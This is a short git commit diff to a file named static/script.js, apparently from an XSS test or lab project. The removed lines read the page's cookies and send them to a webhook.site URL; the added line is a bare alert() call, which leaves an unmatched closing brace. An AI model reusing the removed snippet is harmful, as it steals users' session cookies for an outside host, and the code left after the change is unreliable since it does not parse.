70c3eb6793065f1b881e6a8c1e661b4932e6d12c
HanX2017 <154918263+HanX2017@users.noreply.github.com>
2025-08-12 00:23:20 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,8 +1,8 @@
 (() => {
   try {
-    if (document.cookie) {
-      fetch("https://webhook.site/ae45bf46-4c24-4e26-9704-986cfbe83d6a?cookie=" + encodeURIComponent(document.cookie));
+    alert()
     }
   } catch (e) {
   }
 })();
+
